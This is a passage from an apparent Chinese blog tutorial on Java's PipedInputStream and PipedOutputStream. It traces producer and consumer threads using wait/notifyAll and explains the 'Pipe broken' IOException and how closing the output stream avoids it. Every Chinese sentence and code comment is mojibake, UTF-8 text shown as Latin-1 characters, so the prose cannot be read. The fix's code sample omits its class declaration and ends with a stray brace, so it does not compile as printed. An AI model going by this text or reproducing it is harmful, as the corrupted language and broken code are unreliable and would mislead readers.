ââä»PipedInputStreamï¼æ¶è´¹èï¼è¯»åå­èæ°æ®çæ¶è´¹èçº¿ç¨çæ§è¡è¿ç¨å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213038694-175651231.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213049017-456869541.png" class="lazyload"></p>
<h6 id="321å éå¾ªç¯ååéå éå¾ªç¯è¯»å°byteæ°ç»bä¸­åå¤çæ¶1ä¸ªçäº§èçº¿ç¨å1ä¸ªæ¶è´¹èçº¿ç¨å¤çæ°æ®çè¿ç¨">3.2.1ãå éå¾ªç¯ååéå éå¾ªç¯è¯»å°byte[]æ°ç»bä¸­åå¤çæ¶1ä¸ªçäº§èçº¿ç¨å1ä¸ªæ¶è´¹èçº¿ç¨å¤çæ°æ®çè¿ç¨</h6>
<p>ââæ é¢3.2ä¸­çä»£ç çæ´ä¸ªæ§è¡è¿ç¨å¦ä¸ï¼<br>
â ãmainçº¿ç¨åå§åä¸ä¸ªç¼å²åºï¼byte[]æ°ç»ï¼ï¼é¿åº¦ä¸º1024ï¼é»è®¤å¼ï¼ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213118666-370990115.png" class="lazyload"></p>
<p>â¡ãç¶åçäº§èçº¿ç¨éè¿ä¸æ­çåæ æ¥å®æå½æ°ä¹é´çè°ç¨ï¼æç»æ§è¡PipedInputStream.class::receive(byte b[], int off, int len)å½æ°æ¥å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼è¿è¡å¡«åï¼å¹¶ä¸åå¨èªå·±ççº¿ç¨æ ä¸­æ´æ°inï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼Threadï¼å¯¹è±¡ å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213206234-855863118.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213228794-600203709.png" class="lazyload"></p>
<p>å½çäº§èçº¿ç¨å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼å¡«åå®æä¹åï¼åæ§è¡æ é¢3.2ä¸­çä»£ç </p>
<pre><code>input.wait();
</code></pre>
<p>è¿è¡ä»£ç ä¼éæ¾éå¹¶è®©çäº§èçº¿ç¨è¿å¥æ éç­å¾ï¼ç´å°æ¶è´¹èçº¿ç¨consumeræ§è¡notifyAll()å½æ°æ¥å¤éå½åè¿ä¸ªçäº§èçº¿ç¨ãå¨è¿ä¹åï¼çäº§èçº¿ç¨ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ã<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213330975-716788447.png" class="lazyload"></p>
<p>â¢ãæ¶è´¹èçº¿ç¨è¯»ç¼å²åºï¼byte[]æ°ç»ï¼çè¿ç¨ä¹æ¯éè¿ä¸æ­çåæ æ¥å®æå½æ°ä¹é´çè°ç¨ï¼æç»æ§è¡PipedInputStream::read()å½æ°ï¼è¯æ¢æ§çè¯»å1ä¸ªå­èï¼åPipedInputStream::read(byte b[], int off, int len)å½æ°ï¼è¯»åå©ä½å¶å®çå­èï¼å°æ­¥éª¤â¡ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213355658-1832149818.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213408524-331963725.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213419622-364653237.png" class="lazyload"></p>
<blockquote>
<p>éè¨ï¼æç»æ¶è´¹èçº¿ç¨ä¹ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17ï¼writeSide=å½åè¿ä¸ªæ¶è´¹èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ã</p>
</blockquote>
<p>å æ­¤ï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®çè¿ç¨ä¸­æ²¡ææ§è¡read()å½æ°ä¸­çwait(1000)è¿ä¸è¡ä»£ç ï¼å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214247483-2022355589.png" class="lazyload"></p>
<p>æä»¥ï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»åæ°æ®å°æ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼åªè±è´¹äº0msï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214258804-1015500725.png" class="lazyload"></p>
<p>æ¥ä¸æ¥ï¼å½æ¶è´¹èçº¿ç¨å°æ­¥éª¤â¡ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥ä»¥åï¼éè¿System.arraycopy()å½æ°å¤å¶å°äºæ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­ï¼ï¼æ¶è´¹èçº¿ç¨ä¼éåä»ç¼å²åºè¯»å°çè¿ä¸ªbyte[]æ°ç»ï¼æ¥å¤çè¿äºæ°æ®ï¼å¦ä¸æç¤ºï¼æ é¢3.2ä¸­çä»£ç çæ®µï¼ï¼</p>
<pre><code>                   //æ é¢3.2ä¸­çä»£ç çæ®µ
                   for (int i = 0; i &lt; readBytes; i++) {
                     System.out.print((char) b[i]);//æ¨¡æå¤çå­èæ°æ®
                  }
</code></pre>
<p>ç¶åï¼å½æ¶è´¹èçº¿ç¨åæ¬¡æ§è¡</p>
<pre><code>//æ é¢3.2ä¸­çä»£ç çæ®µ
input.read(b, 0, b.length)
</code></pre>
<p>ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®å°èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼ç±äºæ­¤æ¶inï¼åæéï¼=-1ï¼å¹¶ä¸å½ä¸å¾ä¸­çå¶å®5ä¸ªæ¡ä»¶é½ä¸æç«æ¶ï¼å¤éæ§è¡äº</p>
<pre><code>input.wait()
</code></pre>
<p>ççäº§èçº¿ç¨ï¼ç¶åå½åè¿ä¸ªæ­£å¨ä»ç¼å²åº(byteæ°ç»)ä¸­è¯»æ°æ®çæ¶è´¹èçº¿ç¨æ§è¡wait 1000ms ï¼å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214349541-777000844.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214404547-1644993049.png" class="lazyload"></p>
<p>â£ãå½çäº§èçº¿ç¨è¢«æ¶è´¹èçº¿ç¨æ§è¡ç</p>
<pre><code>notifyAll();
</code></pre>
<p>å¤éä¹åï¼ä¼åæ¬¡éè¿ä¸æ­çåæ æ¥å®æå½æ°ä¹é´çè°ç¨ï¼åæ¬¡æ§è¡PipedInputStream.class::receive(byte b[], int off, int len)å½æ°æ¥å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼è¿è¡å¡«åï¼å¹¶ä¸åå¨èªå·±ççº¿ç¨æ ä¸­åæ´æ°inï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼Threadï¼å¯¹è±¡ å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213206234-855863118.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214506624-944592756.png" class="lazyload"></p>
<p>å½çäº§èçº¿ç¨å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼å¡«åå®æä¹åï¼åæ§è¡æ é¢3.2ä¸­çä»£ç </p>
<pre><code>input.wait();
</code></pre>
<p>è¿è¡ä»£ç ä¼éæ¾éå¹¶è®©çäº§èçº¿ç¨è¿å¥æ éç­å¾ï¼ç´å°æ¶è´¹èçº¿ç¨consumeræ§è¡notifyAll()å½æ°æ¥å¤éå½åè¿ä¸ªçäº§èçº¿ç¨ãå¨è¿ä¹åï¼çäº§èçº¿ç¨ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ãå¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214533848-1664801751.png" class="lazyload"></p>
<p>â¤ãæ¶è´¹èçº¿ç¨å¨ç¬¬â¢æ­¥æ§è¡äº</p>
<pre><code>wait(1000);
</code></pre>
<p>å¨ç­å¾äº1000msä¹åï¼æ¶è´¹èçº¿ç¨ä¼èªå¨å¤éç»§ç»­æ§è¡ï¼æ­¤æ¶èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17å·²ç»è¢«ç¬¬â£æ­¥ä¸­ççäº§èçº¿ç¨ä¿®æ¹ä¸ºinï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼çäº§èçº¿ç¨ä¸ä¼ç´æ¥ä¿®æ¹æ¶è´¹èçº¿ç¨æ ä¸­çåéï¼çäº§èçº¿ç¨ä¼åå°èªå·±çº¿ç¨æ ä¸­inï¼åæéï¼ï¼outï¼è¯»æéï¼åéçå¼ä¿®æ¹å°ä¸»åå­ä¸­ï¼ç¶åæ¶è´¹èçº¿ç¨ä¼èªå·±å°ä¸»åå­ä¸­çè¿2ä¸ªåéå¼å·æ°å°æ¶è´¹èèªå·±ççº¿ç¨æ ä¸­ï¼ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214556548-1757854590.png" class="lazyload"></p>
<p>ç¶åæ§è¡PipedInputStream::read()å½æ°ï¼è¯æ¢æ§çè¯»å1ä¸ªå­èï¼åPipedInputStream::read(byte b[], int off, int len)å½æ°ï¼è¯»åå©ä½å¶å®çå­èï¼å°æ­¥éª¤â£ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213355658-1832149818.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213408524-331963725.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214634067-1884703899.png" class="lazyload"></p>
<blockquote>
<p>éè¨ï¼æç»æ¶è´¹èçº¿ç¨ä¹ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17ï¼writeSide=å½åè¿ä¸ªæ¶è´¹èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ã</p>
</blockquote>
<p>ç±äºï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®çè¿ç¨æ¯ä»æ­¥éª¤â¢ä¸­èªå¨å¤éç»§ç»­æ§è¡çï¼æä»¥ï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»åæ°æ®å°æ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼è±è´¹äº1015msï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214751875-1048696201.png" class="lazyload"></p>
<p>æ¥ä¸æ¥ï¼å½æ¶è´¹èçº¿ç¨å°æ­¥éª¤â£ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥ä»¥åï¼éè¿System.arraycopy()å½æ°å¤å¶å°äºæ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­ï¼ï¼æ¶è´¹èçº¿ç¨ä¼éåä»ç¼å²åºè¯»å°çè¿ä¸ªbyte[]æ°ç»ï¼æ¥å¤çè¿äºæ°æ®ï¼å¦ä¸æç¤ºï¼æ é¢3.2ä¸­çä»£ç çæ®µï¼ï¼</p>
<pre><code>                   //æ é¢3.2ä¸­çä»£ç çæ®µ
                   for (int i = 0; i &lt; readBytes; i++) {
                     System.out.print((char) b[i]);//æ¨¡æå¤çå­èæ°æ®
                  }
</code></pre>
<p>ç¶åï¼å½æ¶è´¹èçº¿ç¨åæ¬¡æ§è¡</p>
<pre><code>//æ é¢3.2ä¸­çä»£ç çæ®µ
input.read(b, 0, b.length)
</code></pre>
<p>ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®å°èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼ç±äºæ­¤æ¶inï¼åæéï¼=-1ï¼å¹¶ä¸å½ä¸å¾ä¸­çå¶å®5ä¸ªæ¡ä»¶é½ä¸æç«æ¶ï¼å¤éæ§è¡äº</p>
<pre><code>input.wait()
</code></pre>
<p>ççäº§èçº¿ç¨ï¼ç¶åå½åè¿ä¸ªæ­£å¨ä»ç¼å²åº(byte[]æ°ç»)ä¸­è¯»æ°æ®çæ¶è´¹èçº¿ç¨æ§è¡wait 1000ms ï¼å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214349541-777000844.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214404547-1644993049.png" class="lazyload"></p>
<p>â¥ãå½çäº§èçº¿ç¨è¢«æ¶è´¹èçº¿ç¨æ§è¡ç</p>
<pre><code>notifyAll();
</code></pre>
<p>å¤éä¹åï¼ä¼åæ¬¡éè¿ä¸æ­çåæ æ¥å®æå½æ°ä¹é´çè°ç¨ï¼åæ¬¡æ§è¡PipedInputStream.class::receive(byte b[], int off, int len)å½æ°æ¥å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼è¿è¡å¡«åï¼å¹¶ä¸åå¨èªå·±ççº¿ç¨æ ä¸­åæ´æ°inï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼Threadï¼å¯¹è±¡ å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213206234-855863118.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214506624-944592756.png" class="lazyload"></p>
<p>å½çäº§èçº¿ç¨å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼å¡«åå®æä¹åï¼åæ§è¡æ é¢3.2ä¸­çä»£ç </p>
<pre><code>input.wait();
</code></pre>
<p>è¿è¡ä»£ç ä¼éæ¾éå¹¶è®©çäº§èçº¿ç¨è¿å¥æ éç­å¾ï¼ç´å°æ¶è´¹èçº¿ç¨consumeræ§è¡notifyAll()å½æ°æ¥å¤éå½åè¿ä¸ªçäº§èçº¿ç¨ãå¨è¿ä¹åï¼çäº§èçº¿ç¨ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼writeSide=å½åè¿ä¸ªçäº§èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ãå¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214533848-1664801751.png" class="lazyload"></p>
<p>â¦ãæ¶è´¹èçº¿ç¨å¨ç¬¬â¤æ­¥æ§è¡äº</p>
<pre><code>wait(1000);
</code></pre>
<p>å¨ç­å¾äº1000msä¹åï¼æ¶è´¹èçº¿ç¨ä¼èªå¨å¤éç»§ç»­æ§è¡ï¼æ­¤æ¶èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17å·²ç»è¢«ç¬¬â¥æ­¥ä¸­ççäº§èçº¿ç¨ä¿®æ¹ä¸ºinï¼åæéï¼=17ï¼outï¼è¯»æéï¼=0ï¼çäº§èçº¿ç¨ä¸ä¼ç´æ¥ä¿®æ¹æ¶è´¹èçº¿ç¨æ ä¸­çåéï¼çäº§èçº¿ç¨ä¼åå°èªå·±çº¿ç¨æ ä¸­inï¼åæéï¼ï¼outï¼è¯»æéï¼åéçå¼ä¿®æ¹å°ä¸»åå­ä¸­ï¼ç¶åæ¶è´¹èçº¿ç¨ä¼èªå·±å°ä¸»åå­ä¸­çè¿2ä¸ªåéå¼å·æ°å°æ¶è´¹èèªå·±ççº¿ç¨æ ä¸­ï¼ï¼ç¶åæ§è¡PipedInputStream::read()å½æ°ï¼è¯æ¢æ§çè¯»å1ä¸ªå­èï¼åPipedInputStream::read(byte b[], int off, int len)å½æ°ï¼è¯»åå©ä½å¶å®çå­èï¼å°æ­¥éª¤â¥ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213355658-1832149818.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219213408524-331963725.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214634067-1884703899.png" class="lazyload"></p>
<blockquote>
<p>éè¨ï¼æç»æ¶è´¹èçº¿ç¨ä¹ä¼å°èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17ï¼writeSide=å½åè¿ä¸ªæ¶è´¹èçº¿ç¨ï¼è¿3ä¸ªåéæ´æ°å°ä¸»åå­ï¼ä¹å°±æ¯å ï¼ä¸­çPipedInputStreamå¯¹è±¡ä¸­ã</p>
</blockquote>
<p>ç±äºï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®çè¿ç¨æ¯ä»æ­¥éª¤â¤ä¸­èªå¨å¤éç»§ç»­æ§è¡çï¼æä»¥ï¼æ¬æ¬¡æ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»åæ°æ®å°æ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼è±è´¹äº1017msï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215231062-1134536045.png" class="lazyload"></p>
<p>æ¥ä¸æ¥ï¼å½æ¶è´¹èçº¿ç¨å°æ­¥éª¤â¥ä¸­çäº§èçº¿ç¨åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­ç17ä¸ªå­èè¯»ååºæ¥ä»¥åï¼éè¿System.arraycopy()å½æ°å¤å¶å°äºæ¶è´¹èçº¿ç¨ä¸­èªå·±åå»ºçbyte[]æ°ç»ä¸­ï¼ï¼æ¶è´¹èçº¿ç¨ä¼éåä»ç¼å²åºè¯»å°çè¿ä¸ªbyte[]æ°ç»ï¼æ¥å¤çè¿äºæ°æ®ï¼å¦ä¸æç¤ºï¼æ é¢3.2ä¸­çä»£ç çæ®µï¼ï¼</p>
<pre><code>                   //æ é¢3.2ä¸­çä»£ç çæ®µ
                   for (int i = 0; i &lt; readBytes; i++) {
                     System.out.print((char) b[i]);//æ¨¡æå¤çå­èæ°æ®
                  }
</code></pre>
<p>ç¶åï¼å½æ¶è´¹èçº¿ç¨åæ¬¡æ§è¡</p>
<pre><code>//æ é¢3.2ä¸­çä»£ç çæ®µ
input.read(b, 0, b.length)
</code></pre>
<p>ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æ°æ®å°èªå·±åå»ºçbyte[]æ°ç»ä¸­æ¶ï¼ç±äºæ­¤æ¶inï¼åæéï¼=-1ï¼å¹¶ä¸å½ä¸å¾ä¸­çå¶å®5ä¸ªæ¡ä»¶é½ä¸æç«æ¶ï¼å¤éæ§è¡äº</p>
<pre><code>input.wait()
</code></pre>
<p>ççäº§èçº¿ç¨ï¼ç¶åå½åè¿ä¸ªæ­£å¨ä»ç¼å²åº(byte[]æ°ç»)ä¸­è¯»æ°æ®çæ¶è´¹èçº¿ç¨æ§è¡wait 1000ms ï¼å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214349541-777000844.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219214404547-1644993049.png" class="lazyload"></p>
<p>â§ãå½çäº§èçº¿ç¨è¢«æ¶è´¹èçº¿ç¨æ§è¡ç</p>
<pre><code>notifyAll();
</code></pre>
<p>å¤éä¹åï¼ä¼è·³åºforå¾ªç¯ï¼ç»æçäº§èçº¿ç¨ççå½å¨æï¼ä¹åï¼è¯¥çº¿ç¨å¯¹è±¡ä¼è¢«æä½ç³»ç»åæ¶ã<br>
â¨ãæ¶è´¹èçº¿ç¨å¨ç¬¬â¦æ­¥æ§è¡äº</p>
<pre><code>wait(1000);
</code></pre>
<p>å¨ç­å¾äº1000msä¹åï¼æ¶è´¹èçº¿ç¨ä¼èªå¨å¤éç»§ç»­æ§è¡ï¼æ­¤æ¶èªå·±çº¿ç¨æ ä¸­çinï¼åæéï¼= -1ï¼outï¼è¯»æéï¼= 17ï¼å¹¶ä¸ä»</p>
<pre><code>wait(1000);
</code></pre>
<p>çä»£ç ä¹åï¼ç»§ç»­æ§è¡ï¼æ§è¡è¿ç¨å¦ä¸ï¼ä»ä¸å¾çç´«è²æµç¨ç»§ç»­æ§è¡ï¼ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215457614-1446643501.png" class="lazyload"></p>
<p>å¨æ§è¡äº2ä¸ªå¾ªç¯åï¼ç´å°int trials = 0æ¶ï¼æ§è¡å°å¤æ­(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)è¿ä¸ªæ¡ä»¶æ¶å°±ä¼ä¸ºtrueï¼ä¸å¾ççº¢è²æµç¨ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215508348-1020804433.png" class="lazyload"></p>
<p>ç¶åï¼æåºäºä¸ä¸ªIOException("Pipe broken")ï¼å æ­¤ï¼å¯ä»¥å¾åºint trialsåéçå«ä¹ï¼è¿ä¸ªåéæ¯ä¸ä¸ªå¤æ¬¡æ£æµçç­ç¥åéï¼å½çäº§èçº¿ç¨æ²¡æå³é­äºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼æ¶ï¼å¹¶ä¸writeSideåéæåçå½åçäº§èçº¿ç¨å·²ç»è¢«æä½ç³»ç»åæ¶æ¶ï¼æ­¤æ¶å½åçäº§èçº¿ç¨å¯¹è±¡çisAlive()å½æ°ä¼è¿åfalseï¼ï¼æ¶è´¹èçº¿ç¨ä¼æåº1ä¸ªIOException("Pipe broken")ï¼å¹¶ç»æwhileå¾ªç¯ï¼è¿èç»ææ¶è´¹èçº¿ç¨ççå½å¨æãä¹åï¼è¯¥çº¿ç¨å¯¹è±¡ä¹ä¼è¢«æä½ç³»ç»åæ¶ãå¦ä¸å¾æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215557745-511787897.png" class="lazyload"></p>
<h6 id="322ææ ·é²æ­¢321ä¸­ç¬¬æ­¥ççäº§èçº¿ç¨æåºioexceptionpipe-broken">3.2.2ãææ ·é²æ­¢3.2.1ä¸­ç¬¬â¨æ­¥ççäº§èçº¿ç¨æåºIOException("Pipe broken")</h6>
<p>ââåé¡¾3.2.1ä¸­ç¬¬â¨æ­¥ä¸­çæ¶è´¹èçº¿ç¨æåºIOException("Pipe broken")çäº§çè¿ç¨ï¼å½æ§è¡å°å¤æ­(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)è¿ä¸ªæ¡ä»¶æ¶å°±ä¼ä¸ºtrueï¼ä¸å¾ççº¢è²æµç¨ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215508348-1020804433.png" class="lazyload"></p>
<p>é£ä¹ï¼ä½¿ç¨èå°±å¯ä»¥å°ä¸å¾ä¸­çº¢è²æµç¨çåä¸æ­¥åætrueå³å¯ï¼å¦ä¸ä»£ç æç¤ºï¼åªä¿®æ¹äºçäº§èçº¿ç¨ä¸­çä»£ç ï¼æ¶è´¹èçº¿ç¨ä¸­çä»£ç æ²¡æååï¼ï¼</p>
<pre><code>package com.chelong.pipe;
import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
   public static void main(String[] args) throws IOException, InterruptedException {
      final PipedOutputStream output = new PipedOutputStream();
      final PipedInputStream input = new PipedInputStream(output);
      //çäº§èçº¿ç¨
      Thread producer = new Thread(new Runnable() {
         @Override
         public void run() {
            try {
               for (int i = 0; i &lt; 3; i++) {
                  synchronized (input) {
//                    input.wait();
                     output.write("Hello world, pipe!".getBytes());
                     input.wait();//éæ¾éå¹¶æ éç­å¾ï¼ç´å°æ¶è´¹èçº¿ç¨thread2æ§è¡notifyAll()å½æ°æ¥å¤éå½åé»å¡
                  }
               }
            } catch (Exception e) {
               e.printStackTrace();
            } finally {
               try {
                  if (output != null) output.close();//è°ç¨close()å½æ°å³é­çäº§èå¯¹è±¡
               } catch (IOException e) {
                  e.printStackTrace();
               }
            }
         }
      }, "çäº§èçº¿ç¨");

      //æ¶è´¹èçº¿ç¨
      Thread consumer = new Thread(new Runnable() {
         @Override
         public void run() {
            try {
               byte[] b = new byte[1024];//1KB
               int readBytes = -1;
               long lastTime = System.currentTimeMillis();
               while ((readBytes = input.read(b, 0, b.length)) != -1) {
                  long curTime = System.currentTimeMillis();
                  System.out.print(Thread.currentThread().getName() + "æ¬æ¬¡è¯»åè±è´¹æ¶é´ï¼" + (curTime - lastTime) + "msï¼è¯»å°çæ°æ®æ¯ï¼");
                  lastTime = curTime;
                  for (int i = 0; i &lt; readBytes; i++) {
                     System.out.print((char) b[i]);//æ¨¡æå¤çå­èæ°æ®
                  }
                  System.out.println();
               }
            } catch (IOException e) {
               e.printStackTrace();
            }
         }
      }, "æ¶è´¹èçº¿ç¨");
      producer.start();//çäº§èçº¿ç¨å¯å¨
      consumer.start();//æ¶è´¹èçº¿ç¨å¯å¨
   }
}
</code></pre>
<p>ç¨åºè¿è¡ç»æï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215642548-1984110125.png" class="lazyload"></p>
<p>ââéè¿PipedOutputStream.class::close()çæºç å¯ä»¥çå°è¿æ ·ä¿®æ¹åæ¶è´¹èçº¿ç¨ä¸åæåºIOException("Pipe broken")åå ï¼<br>
PipedOutputStream.classï¼çäº§èç±»ï¼çæºç </p>
<pre><code>package java.io;

import java.io.*;

public
class PipedOutputStream extends OutputStream {
    ...çç¥é¨åä»£ç ...
